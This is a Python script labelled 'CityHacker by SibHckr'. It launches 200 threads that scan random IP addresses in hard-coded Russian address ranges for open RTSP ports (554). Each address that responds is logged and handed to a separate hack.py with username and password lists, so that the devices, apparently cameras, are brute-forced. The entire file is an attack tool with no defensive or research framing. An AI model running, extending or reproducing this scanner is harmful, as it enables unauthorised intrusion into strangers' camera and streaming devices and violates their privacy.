import socket
import random
from threading import Thread
import urllib.request
import os
import sys
import itertools
import base64
import argparse
import time


def findTitle(url):
    try:
        webpage = urllib.request.urlopen(url, timeout=1).read()
        title = str(webpage, "utf-8").split('<title>')[1].split('</title>')[0]
    except:
        #print("Errored, ", e)
        pass
    else:
        return title

os.system("cls")

city_arrays = ["31.129.", "31.132.", "31.148.", "46.16.", "46.61.", "46.148.", "46.227.", "79.105.", "80.83.", "91.142.", "188.162.", "213.24.", "213.87.", "195.208."]



def write(str, path):
    print("[CityHacker by SibHckr] новый ip, запись.. " + str + "")
    kekef = open(path, "a+")
    kekef.write(str + "\n")
    kekef.close()


def check():
    while True:
        try:
            adres = str(random.choice(city_arrays)) + str(random.randrange(1, 255)) + "." + str(random.randrange(1, 255))
            #print("conn " + adres)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #sock.settimeout(2)
            sock.connect((adres, 554))
            #data sock.recv(1024)
        except Exception as e:
            #print("err, ", e)
            pass
        else:
            write(adres, "working_ips.txt")
            '''print("[CityHacker by SibHckr] Тестируем на веб страницу...")
            try:
                findTitle("http://" + str(adres) + ":80/")
            except:
                #print("Сайта на кемеровской жопе нет!!!!1!")
                pass
            else:
                print(str(findTitle("http://" + adres + "/")) + adres)'''
            print("[CityHacker by SibHckr] Отправляем на взлом по RTSP протоколу...")
            os.system("python hack.py -u users.txt -P min_pass.txt -ip " + adres)

for i in range(200):
    th = Thread(target=check)
    th.start()